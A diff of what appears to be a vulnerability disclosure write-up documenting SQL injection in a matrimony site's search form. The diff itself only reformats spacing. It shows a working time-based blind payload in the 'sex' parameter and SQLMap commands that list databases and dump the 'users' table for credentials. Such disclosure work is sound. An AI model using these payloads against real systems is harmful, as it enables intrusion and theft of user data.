@@ -90,6 +90,7 @@ Step 3 – Manual SQL Injection
 
 The intercepted POST request was modified by injecting a time-based SQL payload into the  sex parameter. 
 Payload: sex=male'%2b(select*from(select(sleep(20)))a)%2b'&maritalstatus=Single&country=Dubai&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50&search=Search
+
 The application response was delayed by approximately 20 seconds, confirming successful  time-based blind SQL injection.
 
 
@@ -97,9 +98,11 @@ The application response was delayed by approximately 20 seconds, confirming suc
 Step 4 – SQLMap Verification 
 
 The captured request was supplied to SQLMap. 
-command: 
- ```python python .\sqlmap.py -r .\code_test_1.txt --batch --dbs ```
+
+command:  ```python python .\sqlmap.py -r .\code_test_1.txt --batch --dbs ```
+ 
 SQLMap confirmed that the sex parameter is injectable using: 
+
 • Boolean-based Blind SQL Injection  
 • Error-based SQL Injection  
 • Time-based Blind SQL Injection 
@@ -119,8 +122,8 @@ test
 Credential Disclosure 
 
 The vulnerable SQL Injection allowed extraction of user records from the application's  database.
-command: 
-```python python .\sqlmap.py -r .\code_test_1.txt --batch -D matrimony -T users --dump ```
+
+command: ```python python .\sqlmap.py -r .\code_test_1.txt --batch -D matrimony -T users --dump ```
 
 
 The following sensitive information was retrieved: 
